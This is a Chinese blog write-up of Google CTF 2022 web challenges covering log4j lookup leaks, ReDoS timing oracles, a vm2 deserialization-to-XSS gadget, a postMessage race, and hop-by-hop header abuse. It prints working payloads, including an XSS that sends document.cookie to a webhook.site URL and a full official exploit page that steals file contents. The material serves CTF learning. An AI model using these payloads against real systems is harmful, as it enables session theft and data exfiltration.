---
title: GoogleCTF 2022 筆記
catalog: true
date: 2022-07-09 17:36:24
tags: [Security]
categories: [Security]
---

<img src="/img/google-ctf-2022-writeup/cover.png" style="display:none">

第一次參加 GoogleCTF，這次解了一題 web（HORKOS），然後另外一題偏接近但沒解出來（POSTVIEWER），依照慣例簡單寫一下每一題的 web 的解法，以解出人數來排序。

附上關鍵字如下：

1. log4j
2. ReDoS
3. hop by hop
4. JavaScript magic function(?)
5. async/await and Promise
6. race condition

<!-- more -->

### LOG4J(105 solves)

這題迅速就被隊友解掉了，沒什麼仔細看。

簡單來說大概就是有個 Java 的 web service，會用 log4j 印出你輸入的資料：

``` java
public class App {
  public static Logger LOGGER = LogManager.getLogger(App.class);
  public static void main(String[]args) {
    String flag = System.getenv("FLAG");
    if (flag == null || !flag.startsWith("CTF")) {
        LOGGER.error("{}", "Contact admin");
    }
  
    LOGGER.info("msg: {}", args);
    // TODO: implement bot commands
    String cmd = System.getProperty("cmd");
    if (cmd.equals("help")) {
      doHelp();
      return;
    }
    if (!cmd.startsWith("/")) {
      System.out.println("The command should start with a /.");
      return;
    }
    doCommand(cmd.substring(1), args);
  }
```

雖然說這個 log4j 用的版本不是之前那個有漏洞的版本，但因為參數是可控的，所以可以來看一下 log4j 自定義的一些 lookup：https://logging.apache.org/log4j/2.x/manual/lookups.html

用 `${env:FLAG}` 就代表環境變數裡的 flag，而 `${java:runtime}` 會印出 Java 相關的資訊，把兩個結合起來變成：`${java:${env:FLAG}}`，就會噴出錯誤以及 flag：

```
2022-07-08 01:31:16,285 main ERROR Resolver failed to lookup java:CTF{d95528534d14dc6eb6aeb81c994ce8bd} 
java.lang.IllegalArgumentException: CTF{d95528534d14dc6eb6aeb81c994ce8bd} at 
org.apache.logging.log4j.core.lookup.JavaLookup.lookup(JavaLookup.java:116) at 
org.apache.logging.log4j.core.lookup.StrLookup.evaluate(StrLookup.java:119) at 
org.apache.logging.log4j.core.lookup.Interpolator.evaluate(Interpolator.java:190) at 
org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1183) at 
org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1098) at 
org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:974) at 
org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:488) at 
.....
```

### LOG4J2 (43 solves)

同第一題，但是錯誤訊息不會噴出來了，可以利用其他方式來 leak 出來。

例如說隊友用的是這個：

1. `%replace{${env:FLAG}%repeat{x}{200000000}}{CTF.*}{y}`
2. `%replace{${env:FLAG}%repeat{x}{200000000}}{CTX.*}{y}`

產生一個很長的字串，然後用 replace 字串取代，根據最後的時間判斷是不是包含某個字元，前者大概 4~5 秒，後者用 7 秒多。

也可以參考 [maple](https://blog.maple3142.net/2022/07/04/google-ctf-2022-writeups/#web) 構造出的 ReDoS：

```
%replace{S${env:FLAG}E}{^SCTF.a((((((((((((((((((((.)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*E$}{}
```

一樣可以從時間差去慢慢把 flag 找出來。

### HORKOS (10 solves)

這次我自己唯一有解出來的就是這題，滿有趣的。

這一題的話是一個類似購物網站的東西，你在前端選好要的東西以後會產生一包 JSON，送到 `/order` 去：

``` js
const script = new VMScript(fs.readFileSync('./shoplib.mjs').toString().replaceAll('export ','') + `
sendOrder(cart, orders)
`);

app.post('/order', recaptcha.middleware.verify, async (req,res)=>{
    req.setTimeout(1000);
    
    if (req.recaptcha.error && process.env.NODE_ENV != "dev") {
        res.writeHead(400, {'Content-Type': 'text/html'});
        return await res.end("invalid captcha");
    }

    if (!req.body.cart) {
        res.writeHead(400, {'Content-Type': 'text/html'});
        return await res.end("bad request")
    }

    // TODO: Group orders by zip code
    let orders = [];
    let cart = req.body.cart;
    let vm = new VM({sandbox: {orders, cart}});

    let result = await vm.run(script);

    orders = new Buffer.from(JSON.stringify(orders)).toString('base64');

    let url = '/order#' + orders;
    
    bot.visit(CHALL_URL + url);

    res.redirect(url);
});
```

途中會開一個 sandbox 把東西丟到 `shoplib.mjs` 去跑，最後把產生出來的 JSON base64 以後丟到 `/order` 去，先來看一下 `/order` 會做什麼：

``` js
import * as shop from "/js/shoplib.mjs";

window.onload = () => {
    let orders = JSON.parse(atob(location.hash.substr(1)));
    console.log(orders);
    
    (orders).forEach((order) =>  {
        const client = new shop.DeliveryClient(order);
        document.all.order.innerHTML += client;
    })
} 
```

基本上就是拿網址上的 orders，然後呼叫 `new shop.DeliveryClient`，程式碼大概是這樣：

``` js
const escapeHtml = (str) => str.includes('<') ? str.replace(/</g, c => `&#${c.charCodeAt()};`) : str;
const renderLines = (arr) => arr.reduce((p,c) => p+`
<div class="row">
<div class="col-xl-8">
  <p>${escapeHtml(c.key).toString()}</p>
</div>
<div class="col-xl-2">
  <p class="float-end">${escapeHtml(getValue(c.value, 'quantity').toString())}
  </p>
</div>
<div class="col-xl-2">
  <p class="float-end">${escapeHtml(getValue(c.value, 'price').toString())}
  </p>
</div>
<hr>
</div>`, '');

const getValue = (a, p) => p.split('/').reduce((arr,k) => arr.filter(e=>e.key==k)[0].value, a);

const renderOrder = (arr) => {
    return `
    <div class="container">
      <p class="my-5 mx-5" style="font-size: 30px;">Delivery Information</p>
      <div class="row">
        <ul class="list-unstyled">
          <li class="text-black">${escapeHtml(getValue(arr,'cart/address/street').toString())} ${escapeHtml(getValue(arr,'cart/address/number').toString())}</li>
          <li class="text-muted mt-1"><span class="text-black">Invoice</span> #${escapeHtml(getValue(arr, 'orderId').toString())}</li>
          <li class="text-black mt-1">${new Date().toDateString()}</li>
        </ul>
        <hr>
      </div>
      
      ${renderLines(getValue(arr, 'cart/items'))}

      <div class="row text-black">
        <div class="col-xl-12">
          <p class="float-end fw-bold">Total: $1337
          </p>
        </div>
        <hr style="border: 2px solid black;">
      </div>
      <div class="text-center" style="margin-top: 90px;">
        <p>Delivered by ${escapeHtml(getValue(arr, 'driver/username').toString())}. </p>
      </div>

    </div>
`;    
};

export class DeliveryClient {
    constructor(pickledOrder) {
        this.pickledOrder = pickledOrder;
    }
    toString() {
        return renderOrder(this.pickledOrder);
    }
};
```

可以看到東西輸出以前基本上都有經過 `escapeHtml`，除了 `renderLines` 裡面的這個地方：

``` html
<div class="col-xl-8">
  <p>${escapeHtml(c.key).toString()}</p>
</div>
```

其他地方都是 toString 以後再 escapeHtml，這邊則是相反，這會有什麼差呢？看 `escapeHtml` 的實作就知道了：

```js
const escapeHtml = (str) => str.includes('<') ? str.replace(/</g, c => `&#${c.charCodeAt()};`) : str;
```

escape 的時候是先檢查 `str.includes`，所以如果 str 是個陣列的話，就可以 bypass filter，達成 XSS。

因此，這題的目標就是要讓 `c.key` 也就是 `item.key` 這個東西變成陣列，就可以 XSS 了。

要想達成這件事，就要看 server 那邊到底做了什麼事情，因為我們在 server 時會呼叫 `sendOrder(cart, orders)`，最後產生出 orders，接著就來看一下到底是怎麼產生出來的：

``` js
export const pickle = {
    PRIMITIVES: ['String', 'Number', 'Boolean'],
    loads: json => {
        const obj = {};
        for (const {key, type, value} of json) {
            if (type.match(/^pickled/)) {
                obj[key] = pickle.loads(value);
                const constructor = type.replace(/^pickled/, '');
                obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype;
            } else {
                obj[key] = new globalThis[type](value);
            }
        }
        return obj;
    },
    dumps: obj => {
        const json = [];
        for (const key in obj) {
            const value = obj[key];
            const type = value.constructor.name;
            if (typeof type !== 'string') continue;
            if (typeof value == 'object' && !pickle.PRIMITIVES.includes(type)) {
                json.push({
                    key,
                    type: 'pickled' + type,
                    value: pickle.dumps(value)
                });
            } else if (typeof value !== 'undefined') {
                json.push({
                    key,
                    type,
                    value: globalThis[type].prototype.valueOf.call(value)
                });
            }
        }
        return json;
    }
};

const DRIVERS = ['drivefast1', 'johnnywalker', 'onagbike'];

export const sendOrder = async (value, orders) => {
    const delivery = new DeliveryService(new Order(
        pickle.loads(JSON.parse(value))[0]
    ), orders);
    return delivery.sendOrder();
};

export class Driver {
    constructor(username, orders) {
        this.username = username;
        this.orders = orders;
    }
    async sendOrder(order) {
        order.driver = this;
        const pickledOrder = pickle.dumps(order);
        this.orders.push(pickledOrder);
        return true;
    }
};
export class DeliveryClient {
    constructor(pickledOrder) {
        this.pickledOrder = pickledOrder;
    }
    toString() {
        return renderOrder(this.pickledOrder);
    }
};
export class DeliveryService {
    constructor(order, orders) {
        this.order = order;
        this.orders = orders;
    }
    findDriver() {
        return new Driver(
            DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders);
    }
    async sendOrder() {
        const driver = this.findDriver();
        if (await driver.sendOrder(this.order)) {
            return this.order.orderId;
        }
    }
};
export class Order {
    constructor(cart) {
        this.cart = cart;
        this.driver = null;
        this.orderId = this.cart.shoppingCartId;
    }
};
export class ShoppingCart {
    constructor() {
        this.items = {};
        this.address = '';
        this.shoppingCartId = Math.floor(Math.random() * 1000000000000);
    }
    addItem(key, item) {
        this.items[key] = item;
    }
    removeItem(key) {
        delete this.items[key];
    }
};
export class Item {
    constructor(price) {
        this.price = price;
    }
    setQuantity(num) {
        this.quantity = num;
    }
};
export class Address {
    constructor(street, number, zip) {
        this.street = street;
        this.number = number;
        this.zip = zip;
    }
};

```

這邊程式碼其實滿長的，但間單來說傳進去的 cart 會像這樣：

``` js
[
  {
    'key': 'cart',
    'type': 'pickledShoppingCart',
    'value': [
      {
        'key': 'items',
        'type': 'pickledObject',
        'value': [
          {
            'key': 'abc',
            'type': 'pickledItem',
            'value': [
              {
                'key': 'price',
                'type': 'Number',
                'value': 10
              },
              {
                'key': 'quantity',
                'type': 'String',
                'value': '1'
              }
            ]
          }
        ]
      },
      {
        'key': 'address',
        'type': 'pickledAddress',
        'value': [
          {
            'key': 'street',
            'type': 'String',
            'value': ''
          },
          {
            'key': 'number',
            'type': 'Number',
            'value': 0
          },
          {
            'key': 'zip',
            'type': 'Number',
            'value': 0
          }
        ]
      },
      {
        'key': 'shoppingCartId',
        'type': 'String',
        'value': 800600798186
      }
    ]
  },
  {
    'key': 'driver',
    'type': 'pickledDriver',
    'value': [
      {
        'key': 'username',
        'type': 'String',
        'value': 'johnnywalker'
      },
      {
        'key': 'orders',
        'type': 'pickledArray',
        'value': []
      }
    ]
  },
  {
    'key': 'orderId',
    'type': 'String',
    'value': 'abc123'
  }
]
```

可以想成就是一個序列化過後產生的結果，在 server 會用 `pickle.loads(JSON.parse(value))[0]` 來還原成各種 class。

而這過程中最可疑的就是 pickle 的相關函式了：

``` js
export const pickle = {
  PRIMITIVES: ['String', 'Number', 'Boolean'],
  loads: json => {
    const obj = {};
    for (const {key, type, value} of json) {
      if (type.match(/^pickled/)) {
        obj[key] = pickle.loads(value);
        const constructor = type.replace(/^pickled/, '');
        obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype;
      } else {
        obj[key] = new globalThis[type](value);
      }
    }
    return obj;
  },
  dumps: obj => {
    const json = [];
    for (const key in obj) {
      const value = obj[key];
      const type = value.constructor.name;
      if (typeof type !== 'string') continue;
      if (typeof value == 'object' && !pickle.PRIMITIVES.includes(type)) {
        json.push({
          key,
          type: 'pickled' + type,
          value: pickle.dumps(value)
        });
      } else if (typeof value !== 'undefined') {
        json.push({
          key,
          type,
          value: globalThis[type].prototype.valueOf.call(value)
        });
      }
    }
    return json;
  }
};
```

這邊我一開始注意到的是 `obj[key] = new globalThis[type](value);` 這一段，如果讓 type 是 `Function` 的話，我們就可以產生出一個 function，如果可以設法 call 到那個 function，就可以在 sandbox 裡面執行程式碼，去竄改 orders 之類的。

另一個注意到的是：

``` js
obj[key] = pickle.loads(value);
const constructor = type.replace(/^pickled/, '');
obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype;
```

這邊 `pickle.loads` 的回傳值一定是 object，搭配後面的 `obj[key].__proto__` 那個，我們其實可以讓一個 object 的 `__proto__` 變成 `String` 或是 `Number` 的 object 之類的，不過似乎沒什麼幫助。

還有嘗試過的是把 key 改成 `__proto__`，想說這樣是不是可以去改 `obj.__proto__.__proto__`，但會丟這個錯誤出來：

> `TypeError: Immutable prototype object '#<Object>' cannot have their prototype set`
    
卡在這題其實卡滿久的，我原本的思考方式是想說要執行程式碼可能太難，搞不好可以藉由亂搞 `__proto__` 讓最後輸出的 key 變成陣列。但後來我仔細看了一下最後 dump 的程式碼：

``` js
const json = [];
for (const key in obj) {
  const value = obj[key];
  const type = value.constructor.name;
  if (typeof type !== 'string') continue;
  if (typeof value == 'object' && !pickle.PRIMITIVES.includes(type)) {
    json.push({
      key,
      type: 'pickled' + type,
      value: pickle.dumps(value)
    });
  } else if (typeof value !== 'undefined') {
    json.push({
      key,
      type,
      value: globalThis[type].prototype.valueOf.call(value)
    });
  }
}
return json;
```

你的 key 是從 `for in` 拿出來的，保證是字串，所以這邊輸出的 key 無論如何都會是字串。所以，如果想要讓最後 orders 裡面的 key 是陣列的話，勢必是要能執行程式碼，才能直接對 orders 進行操作。

此時我沈澱了一下，回歸到這題的本質：反序列化。

在 PHP、Python 或是 Java 裡面，都有反序列化相關的洞可以打，而打的方式無非就是找到一些 gadget，也就是一些 magic method 的組合，而這題應該也是這樣的。

於是我重新看了一遍程式碼，找出有沒有哪些地方會有隱式的轉型，就能夠構造一個 `toString` 或是 `valueOf` 去執行之類的，不過找了一遍發現沒有。

雖然說沒看到這些東西，但我卻發現一個覺得有機會的地方：

``` js
export class DeliveryService {
  constructor(order, orders) {
    this.order = order;
    this.orders = orders;
  }
  findDriver() {
    return new Driver(
      DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders);
  }
  async sendOrder() {
    const driver = this.findDriver();
    if (await driver.sendOrder(this.order)) {
      return this.order.orderId;
    }
  }
};
```

重點是那個 sendOrder 跟它最後 return 的東西。

在 JS 裡面，如果你在 async function 裡面回傳一個 Promise，它是會被解析的，如下：

``` js
async function test() {
  const p = new Promise(resolve => {
    console.log(123)
    resolve()
  })
  return p
}

test()
```

你可以看到 console 印出了 123，而且外層的呼叫並不需要 await。

因此，如果 `this.order.orderId` 是一個 Promise，就可以在 then 裡面偷塞程式碼了。

馬上來做個實驗：

``` js
async function test() {
  var obj = {
    then: function(resolve) {
      console.log(123)
      resolve()
    }
  }
  obj.__proto__ = Promise.prototype
  return obj
}

test()
```

執行以後順利輸出了 `123`，代表這個 idea 是可行的。所以，我們只要構造出這樣一段 JSON 即可在 sandbox 裡面執行程式碼，並且去改動 orders：

``` js
{
  "key":"shoppingCartId",
  "type":"pickledPromise",
  "value":[
    {
      "key":"then",
      "type":"Function",
      "value":"globalThis.orders.push(JSON.parse('"+payload+"'));arguments[0]();"
    }
  ]
}
```

（賽後我才想起來其實直接去改 `orders[0]` 就好，沒必要大費周章再 push 一個） 

程式碼裡面的 `arguments[0]` 是 `resolve` 參數，沒有呼叫的話會卡住。

最後，我拿來測試以及產生 payload 的程式碼如下：

``` js
const {VM, VMScript} = require("vm2");
const fs = require('fs');

const script = new VMScript(fs.readFileSync('./myshoplib.mjs').toString().replaceAll('export ','') + `
sendOrder(cart, orders)
`);

async function main () {
  let orders = [];

  let payload = JSON.stringify([
    {
        'key': 'cart',
        'type': 'pickledShoppingCart',
        'value': [
            {
                'key': 'items',
                'type': 'pickledObject',
                'value': [
                    {
                        'key': ['<img src=x onerror="location=`https://webhook.site/d8dc1452-8e82-408d-9dcf-8ad713754f36/?q=${encodeURIComponent(document.cookie)}`">'],
                        'type': 'pickledItem',
                        'value': [
                            {
                                'key': 'price',
                                'type': 'Number',
                                'value': 10
                            },
                            {
                                'key': 'quantity',
                                'type': 'String',
                                'value': '1'
                            }
                        ]
                    }
                ]
            },
            {
                'key': 'address',
                'type': 'pickledAddress',
                'value': [
                    {
                        'key': 'street',
                        'type': 'String',
                        'value': ''
                    },
                    {
                        'key': 'number',
                        'type': 'Number',
                        'value': 0
                    },
                    {
                        'key': 'zip',
                        'type': 'Number',
                        'value': 0
                    }
                ]
            },
            {
                'key': 'shoppingCartId',
                'type': 'String',
                'value': 800600798186
            }
        ]
    },
    {
        'key': 'driver',
        'type': 'pickledDriver',
        'value': [
            {
                'key': 'username',
                'type': 'String',
                'value': 'johnnywalker'
            },
            {
                'key': 'orders',
                'type': 'pickledArray',
                'value': []
            }
        ]
    },
    {
        'key': 'orderId',
        'type': 'String',
        'value': 'PEW'
    }
]).replaceAll('"', '\\"')
  
  let cart = JSON.stringify(
    [{"key":"0","type":"pickledShoppingCart","value":[{"key":"items","type":"pickledObject","value":[{"key":"Tomato","type":"pickledItem","value":[{"key":"price","type":"Number","value":10},{"key":"quantity","type":"String","value":"1"}]},{"key":"Pickle","type":"pickledItem","value":[{"key":"price","type":"Number","value":8},{"key":"quantity","type":"String","value":"0"}]},{"key":"Pineapple","type":"pickledItem","value":[{"key":"price","type":"Number","value":44},{"key":"quantity","type":"String","value":"0"}]}]},{"key":"address","type":"pickledAddress","value":[{"key":"street","type":"String","value":"1"},{"key":"number","type":"Number","value":0},{"key":"zip","type":"Number","value":0}]},{"key":"shoppingCartId","type":"pickledPromise","value":[{"key":"then","type":"Function","value":"globalThis.orders.push(JSON.parse('"+payload+"'));arguments[0]();"}]}]}]
  );


  let vm = new VM({sandbox: {orders, cart, console}});
  console.log('before')
  try {
    let result = await vm.run(script);
  } catch(err){
    console.log('err', err)
  }
  console.log('after')
  console.log('orders')
  console.log(orders)

  console.log(encodeURIComponent(cart))

  //console.log(orders[0][0].value[0])
}
main()
```

### POSTVIEWER (10 solves)

直接附上這題的核心程式碼：

``` html
const SHIM = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SHIM</title>
</head>
<body>
    <script>
        onmessage = (e) => {
            if (e.data.body === undefined || !e.data.mimeType) {
                return;
            };
            const blob = new Blob([e.data.body], {
                type: e.data.mimeType
            });
            onunload = () => e.source.postMessage("blob loaded", "*");
            location = URL.createObjectURL(blob);
        };
    <\\/script>
</body>
</html>`
const SHIM_DATA_URL = `data:text/html,<script>
    location=URL.createObjectURL(new Blob([\`${SHIM}\`], {type:"text/html"}))
</script>`;
async function previewIframe(container, body, mimeType) {
    var iframe = document.createElement('iframe');
    iframe.src = SHIM_DATA_URL;
    container.appendChild(iframe);
    iframe.addEventListener('load', () => {
        iframe.contentWindow?.postMessage({ body, mimeType }, '*');
    }, { once: true });
}
```

當你呼叫 `previewIframe` 的時候，會先產生出一個 iframe，然後裡面的 HTML 再用 `location=URL.createObjectURL` 的方式產生出另一個 HTML，在裡面用 `onmessage` 去聽訊息，在外層監聽到 iframe 載入成功後，才用 `postMessage` 把要顯示的東西丟進去。

這題的話，有一個 race condition 的問題，那就是如果我們一直對 iframe 狂發 `postMessage`，就能早於 iframe onload 裡面那個，就能搶先一步 render 我們需要的東西，控制 iframe 裡的內容。

由此不難看出這題理想的流程是：

1. previewIframe 被呼叫
2. iframe 被建立，載入 SHIM
3. SHIM 載入成功，開始監聽訊息
4. 我們的 postMessage 成功，開始載入我們的內容
5. 我們的內容載入完成
6. iframe onload 觸發，執行 `iframe.contentWindow?.postMessage`
7. 我們的 HTML 接收到檔案內容，成功竊取檔案

而當初在這解這題時，碰到的問題是 5 跟 6 的順序，不管怎麼試都沒辦法，只能做到：「我們的東西確實有載入，但已經錯過了外層的 postMessage」。

一開始在解題時的想法是為了要贏 race condition，要狂送猛送，像是這樣：

``` js
function send() {
  w[0]?.postMessage({
    body: 'test',
    mimeType: 'text/html'
  }, '*')
  setTimeout(send, 0)
}
send()
```

但這樣卻發現連 XSS 都無法觸發，但把 timeout 改大一點例如說 20 卻可以。

後來我陸續做了一些實驗，明白不能這樣做的原因了，是因為這一段：

``` js
onmessage = (e) => {
    if (e.data.body === undefined || !e.data.mimeType) {
        return;
    };
    const blob = new Blob([e.data.body], {
        type: e.data.mimeType
    });
    onunload = () => e.source.postMessage("blob loaded", "*");
    location = URL.createObjectURL(blob);
};
```

這邊要注意到的是 `location = URL.createObjectURL(blob)` 這一段跑完以後，location 還不會馬上切換。所以，如果我們一直送 message 的話，就會一直進來 onmessage，然後 location 那行就一直被觸發，上一個 location 還沒載入好就再 assign 一個新的，變成像無窮迴圈那樣。

之所以 timeout 改長會可以，是因為假設改成 20，而 location 載入的時間 < 20ms，新的 message 發送時頁面就被換掉了，因此可以成功觸發 XSS。

然後，我還做了實驗注意到 location 的載入是跟 UI thread 無關的，也就是：

``` js
location = '//example.com'
while(1){}
```

這樣的程式碼還是會成功換頁，是沒有問題的。

這題最難把握的是送出 message 的時機，為什麼我們要一直送？因為我們不知道在什麼確切的時間點要送，才要一直去試。我可以等 iframe 有了才去送，但那時的 iframe 還沒載入 SHIM，所以送了訊息也沒用。那我們要怎麼知道 SHIM 載入成功？我們不知道，所以這才麻煩。

後來繼續實驗，也發現可以藉由一直改變 hash 或是用一個很耗時的 selector 造成 main thread 的 delay，但依舊無法控制順序，最後也就沒解出來。

官方的解答在這：https://gist.github.com/terjanq/7c1a71b83db5e02253c218765f96a710

看了之後才發現我把順序搞錯了。

之前我在想的一直是要時時刻刻去 delay main thread，但因為主頁面跟 iframe 是不同 process，所以我們只要一偵測 iframe 載入成功，就可以先想辦法去 delay main thread，這時候 iframe 還是會繼續載入 SHIM，但是 onload 因為被堵住所以暫時不會觸發。

此時我們只要隔個一段時間（官方解是 500ms）之後再去 postMessage 即可，那時的 SHIM 已經載入完畢，而此時 main thread 雖然還是被 block 住，但 iframe 還是會持續載入。

如此一來，最後 main thread 有空做事情的時候，我們的 iframe 就已經載入好了，也就可以拿到資料。

### GPUSHOP2 (7 solves)

這題是從去年改的，去年的解法可以參考這邊：https://github.com/ComdeyOverFlow/Google_CTF_2021/blob/main/gpushop.md

我沒有很仔細看，但應該就是把某一段 path 做 URL encode 導致 proxy 沒配對到路徑之類的。

今年的版本把去年的問題修掉了，無論如何都先加一個 `X-Wallet: EMPTY` 的 header，所以去年的解法就沒辦法使用。

最後的解法是 hop-by-hop headers，這是什麼東西呢？

HTTP request headers 可以分成兩種類型：

1. End-to-end
2. Hop-by-hop

因為你發 HTTP request 的時候中間可能會經過 proxy 對吧？而 Hop-by-hop 的話就是給 proxy 看的 header，proxy 會對它做一些處理，處理完之後可能就不會 forward 給下一個 server。

底下幾個都屬於 hop-by-hop headers：

1. Connection
2. Keep-Alive
3. Proxy-Authenticate
4. Proxy-Authorization
5. TE
6. Trailers
7. Transfer-Encoding
8. Upgrade

除此之外呢，根據 spec 的定義，放到 `Connection` 裡面的 headers 也應該被當成 hop-by-hop，例如說：

```
Connection: close, X-Foo, X-Bar
```

就是叫 proxy 要把 X-Foo 跟 X-Bar 當成 hop-by-hop，把它移除掉，不會繼續發送給下一個 proxy。

因此這一題就可以利用這個功能，把 `X-Wallet` 給移除：

```
Connection: X-Wallet
```

更多相關研究可以參考這篇文章：https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers

## POSTVIEWER 腳本備份

備份一下官方解答腳本，裡面看起來是用 postMessage + onmessage 來達到非同步的無窮迴圈的效果，滿有趣的。

``` html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>POC Vulnerable website</title>
</head>
<body>
    <h1>Click me!</h1>
    <iframe style="width:1px;height:1px" name="loop"></iframe>
    <pre id="log"></pre>
    <script>
        const URL = 'https://postviewer-web.2022.ctfcompetition.com';
        const sleep = (d) => new Promise((r) => setTimeout(r, d));
        function notify(...args){
            navigator.sendBeacon('', args);
            console.log(...args);
        }
        async function load(win, url) {
            const buffer = new Uint8Array(1e7);
            win.location = 'about:blank';
            await new Promise((resolve) => {
                loop.onmessage = () => {
                    try {
                        win.origin;
                        resolve();
                    } catch (e) {
                        loop.postMessage(null);
                    }
                };
                loop.postMessage(null);
            });
            win.location = url;
            await new Promise((resolve) => {
                loop.onmessage = () => {
                    if (win.length === 1) {
                        // Send a huge message so e.data.toString() blocks a thread for a while
                        // By transfering only a reference to memory chunk, sending the message
                        // will be fast enough to race condition window.onmessage and iframe.onload
                        // notify(Date.now(), '==1');
                        win?.postMessage(buffer, '*', [buffer.buffer]);
                        // Once we know the innerIframe loaded, we can now postMessage to it
                        // because it will be rendered in a different process in Chrome, so
                        // the blocked parent thread won't affect rendering the iframe!
                        setTimeout(() => {
                            win[0]?.postMessage(
                                {
                                    body: `LOL! <script>onmessage=async (e)=>{
                      let text = await e.data.body.text();
                      parent.opener.postMessage({stolen: text}, '*');
                    }<\/script>`,
                                    mimeType: "text/html",
                                },
                                "*"
                            );
                            resolve();
                        }, 500);
                    } else {
                        loop.postMessage(null);
                    }
                };
                loop.postMessage(null);
            });
            return 1;
        }
        var TIMEOUT = 1500;
        var win;
        function waitForMessage(url) {
            return new Promise(async resolve => {
                onmessage = e => {
                    if (e.data.stolen) {
                        notify(e.data.stolen);
                        log.innerText += e.data.stolen + '\n';
                        resolve(false);
                    }
                }
                const rnd = 'a' + Math.random().toString(16).slice(2);
                const _url = url + ',' + rnd;
                await load(win, _url);
                setTimeout(() => {
                    resolve(true);
                }, TIMEOUT);
            });
        }
        onload = onclick = async () => {
            if (!win || win.closed) {
                win = open('about:blank', 'hack', 'width=800,height=300,top=500');
            }
            for (let i = 1; i < 100; i++) {
                const url = `${URL}/#a,.list-group-item:nth-child(${i})`;
                while (await waitForMessage(url));
            }
        };
    </script>
</body>
</html>
```